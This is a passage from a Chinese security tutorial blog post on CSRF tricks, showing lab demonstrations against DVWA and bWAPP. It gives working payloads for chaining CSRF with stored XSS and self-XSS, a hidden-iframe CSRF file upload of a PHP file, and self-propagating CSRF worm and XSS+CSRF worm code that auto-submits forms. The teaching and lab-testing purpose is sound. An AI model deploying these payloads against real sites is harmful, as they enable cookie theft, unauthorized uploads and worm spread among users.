class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>在留言的地方即存储型XSS处，注入XSS的payload，内容为script标签，其中src属性值为CSRF攻击请求：</p><p><img src="/2020/01/21/CSRF-Tricks小结/10.png" alt=""></p><p>当其他用户访问到该留言内容时，就会被自动进行CSRF攻击篡改密码了：</p><p><img src="/2020/01/21/CSRF-Tricks小结/11.png" alt=""></p><h3 id="CSRF-Self-XSS"><a href="#CSRF-Self-XSS" class="headerlink" title="CSRF+Self-XSS"></a>CSRF+Self-XSS</h3><p>对于Self-XSS，我们知道该类型的XSS漏洞是由用户自己输入给自己造成的攻击的一种XSS，很鸡肋。但如果Self-XSS和CSRF组合利用，则可以将漏洞影响面从用户自己本身扩展到了其他的用户，提高了漏洞的危害性。比如一个需登录站点存在一个Self-XSS，一般是用户自己才能自己搞自己，但是如果站点存在CSRF，则可以直接用来跨站伪造发起Self-XSS来窃取受害者的cookie信息。</p><blockquote><p>一般来说，个人信息修改页面只有用户自己才能够看得到。假设网站A右上角的<code>你好，用户</code>这个地方存在XSS，并且在修改昵称为XSS payload后能够触发这个XSS。但是这个网站没有能够让其他用户看到你昵称的类似于留言板讨论区的地方，而管理员也一百年不会去看一下你的昵称，这个XSS就成为了一个鸡肋的SELF-XSS。因为普通用户怎么可能把昵称改成XSS payload来把Cookie送给你，你又没办法把自己的昵称改成恶意代码然后让别人看到，所以只能用来X自己。但如果同时这个网站有一个CSRF漏洞的话那就不一样了。我们可以通过以下操作来打任意用户的Cookie：</p><p>1.在恶意网站B中写入CSRF payload，使用这个CSRF来修改用户在A网站的昵称为XSS payload</p><p>2.诱惑用户访问恶意网站B，CSRF payload触发，用户在A网站的昵称被修改为XSS payload</p><p>3.用户重新访问A网站时，由于右上角显示了昵称，所以会触发对应的XSS payload，乖乖的把Cookie给你送过来</p><p>这样，一个SELF-XSS便被利用了。恶意网站B可以是我们自己建立的，也可以是某些存在XSS漏洞的大型网站，通常大型网站更容易受信任。这些大型网站可能本身设置了<code>HTTP-ONLY</code>导致攻击者无法拿到Cookie，又不好做其他操作。但是用来做攻击其他网站的跳板却是无法防范的。</p></blockquote><p>CSRF+Self-XSS案例：<a href="https://www.freebuf.com/articles/web/164069.html" target="_blank" rel="noopener">鸡肋CSRF和Self-XSS组合的变废为宝</a></p><p>JSON CSRF+Self-XSS案例：<a href="https://parrotsec-cn.org/t/topic/1423" target="_blank" rel="noopener">一次XSS+CSRF的组合拳进攻(CSRF+JSON)</a></p><h2 id="0x06-CSRF-文件上传漏洞组合拳"><a href="#0x06-CSRF-文件上传漏洞组合拳" class="headerlink" title="0x06 CSRF+文件上传漏洞组合拳"></a>0x06 CSRF+文件上传漏洞组合拳</h2><p>我们知道，文件上传都是通过POST方式来上传的，而POST方式的CSRF只能通过表单的方式来发起攻击。这就存在一个问题，就是构造的表单提交的数据跟浏览器文件上传提交的数据会有所区别，即上传的请求会有一个filename的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------70772515222937</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;phpinfo.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------70772515222937</span><br></pre></td></tr></table></figure><p>如果通过构造表单的方式实现文件上传，是没办法构造filename参数的，这是因为filename参数是由<code>&lt;input&gt;</code>标签自动生成的，是没办法通过表单来实现伪造的，从而能防御CSRF实现文件上传。</p><p>但自从HTML5出现后，有个叫CORS（跨域资源共享）的东西，让我们能够实现CSRF来上传文件。具体点说，就是利用JavaScript来对目标站点的上传点发起文件上传请求，<strong>这是因为CORS虽然不允许非法的外域读取本站点的资源、但并不阻止外域向本站发起请求，而CSRF刚刚好只是发起操作请求而非读取站点资源，这就构成了CSRF+文件上传漏洞的组合拳场景</strong>。</p><p>这种方式用BP就能生成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">      &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http:\/\/192.168.10.132\/dvwa\/vulnerabilities\/upload\/"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"multipart\/form-data; boundary=---------------------------30913605125121"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> body = <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"100000\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"uploaded\"; filename=\"phpinfo.php\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Type: application/octet-stream\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\x3c?php\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"    phpinfo();\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"?\x3e\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"Upload\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Upload\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121--\r\n"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span></span><br><span class="line"><span class="undefined">          aBody[i] = body.charCodeAt(i); </span></span><br><span class="line"><span class="actionscript">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后自己再添加下JS自动点击上传按钮，并用iframe标签来隐藏攻击过程即可。</p><p>csrf.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">      &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http:\/\/192.168.10.132\/dvwa\/vulnerabilities\/upload\/"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"multipart\/form-data; boundary=---------------------------30913605125121"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> body = <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"100000\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"uploaded\"; filename=\"phpinfo.php\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Type: application/octet-stream\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\x3c?php\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"    phpinfo();\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"?\x3e\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"Upload\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Upload\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"-----------------------------30913605125121--\r\n"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span></span><br><span class="line"><span class="undefined">          aBody[i] = body.charCodeAt(i); </span></span><br><span class="line"><span class="actionscript">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'form'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>csrf_iframe.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">hidden</span>=<span class="string">"hidden"</span>&gt;</span>hi<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使已登录的用户访问，成功实现CSRF上传文件：</p><p><img src="/2020/01/21/CSRF-Tricks小结/1.png" alt=""></p><p><img src="/2020/01/21/CSRF-Tricks小结/2.png" alt=""></p><h2 id="0x07-CSRF蠕虫"><a href="#0x07-CSRF蠕虫" class="headerlink" title="0x07 CSRF蠕虫"></a>0x07 CSRF蠕虫</h2><blockquote><p>其实CSRF蠕虫漏洞本身还是一个CSRF漏洞，只不过基于漏洞的具体场景特殊性，一旦这个场景使得这个csrf具备了传播型，那么该漏洞就赋予了蠕虫性质。</p></blockquote><p>其实，CSRF蠕虫并非必须和XSS组合才能触发，仅仅是CSRF漏洞也能发起蠕虫攻击，前提是该CSRF是可以控制发起的表单中的内容指向为该CSRF payload本身，导致循环触发。</p><p>比如一个提交帖子的表单操作存在CSRF漏洞，然而攻击者利用这个漏洞通过提交恶意表单来往帖子里的内容写入恶意的地址，该地址正是该CSRF漏洞的PoC，如此一来只要其他用户访问这个帖子的链接即可自动被CSRF攻击、以该用户身份新建一个一毛一样的帖子，然后就继续传染下去。</p><p>案例参考：</p><p><a href="https://www.codercto.com/a/40828.html" target="_blank" rel="noopener">基于社交媒体的csrf蠕虫风暴探索</a></p><p><a href="https://www.uedbox.com/post/36858/" target="_blank" rel="noopener">新浪另类CSRF蠕虫放大危害</a></p><p><a href="https://bbs.ichunqiu.com/thread-21477-1-1.html" target="_blank" rel="noopener">经典的XSS+CSRF结合造成的蠕虫病毒式推广</a></p><p><a href="https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html" target="_blank" rel="noopener">分享一个jsonp劫持造成的新浪某社区CSRF蠕虫</a></p><h3 id="Demo1——纯CSRF蠕虫"><a href="#Demo1——纯CSRF蠕虫" class="headerlink" title="Demo1——纯CSRF蠕虫"></a>Demo1——纯CSRF蠕虫</h3><p>下面我们以bWAPP的XSS - Stored (Blog)作为场景，因为这是一个博客留言的系统，适用于CSRF蠕虫的演示。</p><p>我们先新建一个alan用户，博客内容写上我们CSRF蠕虫payload的地址，这时所有用户都能查看：</p><p><img src="/2020/01/21/CSRF-Tricks小结/3.png" alt=""></p><p>csrf_iframe.html为引用iframe隐藏CSRF攻击过程页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">hidden</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>csrf.html，针对提交博客内容的表单请求发起CSRF攻击，博文内容指向csrf_iframe.html、这就形成了恶意的循环、造成CSRF蠕虫，这里JS自动点击提交：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.10.133/bWAPP/xss_stored_1.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry"</span> <span class="attr">value</span>=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#95;iframe&amp;#46;html"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"blog"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry&amp;#95;add"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'form'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当其他用户如bee登录博客系统，就能看到alan用户的发的博客是个链接，当bee用户点击访问时就会自动触发CSRF蠕虫攻击：</p><p><img src="/2020/01/21/CSRF-Tricks小结/4.png" alt=""></p><p>再回到Blog界面会看到，bee用户也发布了一样的博文，说明被成功CSRF蠕虫攻击：</p><p><img src="/2020/01/21/CSRF-Tricks小结/5.png" alt=""></p><p>如此下去，其他用户看到并访问即可继续感染CSRF蠕虫。</p><h3 id="Demo2——XSS-CSRF组合蠕虫"><a href="#Demo2——XSS-CSRF组合蠕虫" class="headerlink" title="Demo2——XSS+CSRF组合蠕虫"></a>Demo2——XSS+CSRF组合蠕虫</h3><p>进一步的，如果站点还存在XSS漏洞，那么XSS+CSRF蠕虫的攻击将更为深入。</p><p>还是以前面的Blog系统为例，删除掉前面创建的博客内容。我们以新建alan用户登录并验证是否存在存储型XSS，提交博文内容为<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>：</p><p><img src="/2020/01/21/CSRF-Tricks小结/6.png" alt=""></p><p>编写csrf.html如下，对提交博文进行CSRF攻击：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"csrf"</span> <span class="attr">action</span>=<span class="string">"http://192.168.10.133/bWAPP/xss_stored_1.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry"</span> <span class="attr">value</span>=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"blog"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry&amp;#95;add"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementById(<span class="string">'csrf'</span>);</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段HTML代码测试是OK的，问题在于我们要想XSS和CSRF进行组合利用，那就需要将这段内容转换为JavaScript代码的形式才能被script标签加载进来成功执行。这里可以使用XSS’OR工具来对这段HTML代码进行转换：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.writeln(<span class="string">"&lt;html&gt;&lt;!--CSRF PoC-generated by Burp Suite Professional--&gt;&lt;body&gt;&lt;script&gt;history.pushState(\'\',\'\',\'\/\')&lt;\/script&gt;&lt;form id=\"csrf\"action=\"http:\/\/192.168.10.133\/bWAPP\/xss_stored_1.php\"method=\"POST\"&gt;&lt;input type=\"hidden\"name=\"entry\"value=\"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js\"\/&gt;&lt;input type=\"hidden\"name=\"blog\"value=\"submit\"\/&gt;&lt;input type=\"hidden\"name=\"entry&amp;#95;add\"value=\"\"\/&gt;&lt;input type=\"submit\"value=\"Submit request\"\/&gt;&lt;\/form&gt;&lt;\/body&gt;&lt;script&gt;var m=document.getElementById(\'csrf\');m.submit();&lt;\/script&gt;&lt;\/html&gt;"</span>);</span><br></pre></td></tr></table></figure><p>这段JavaScript代码的实现很简单，直接将HTML代码内容放入document.writeln()函数中，直接将其写入当前HTML页面。</p><p>注意，前面这段实现CSRF攻击的HTML或JavaScript代码在提交表单新建博文时内容是填写的<code>http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js</code>而非XSS payload。这里如果要修改为实现XSS+CSRF蠕虫的payload，由于博文内容需要填入尖括号<code>&lt;&gt;</code>，因此这种方式并不能提交。</p><p>下面我们换种写法，利用JavaScript来创建表单和输入项再提交，csrf2.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_form</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(f);</span><br><span class="line">f.method = <span class="string">"post"</span>;</span><br><span class="line"><span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_elements</span>(<span class="params">eForm, eName, eValue</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">eForm.appendChild(e);</span><br><span class="line">e.type = <span class="string">'hidden'</span>;</span><br><span class="line">e.name = eName;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">document</span>.all) &#123;</span><br><span class="line">e.style.display = <span class="string">'none'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">e.style.display = <span class="string">'block'</span>;</span><br><span class="line">e.style.width = <span class="string">'0px'</span>;</span><br><span class="line">e.style.height = <span class="string">'0px'</span>;</span><br><span class="line">&#125;</span><br><span class="line">e.value = eValue;</span><br><span class="line"><span class="keyword">return</span> 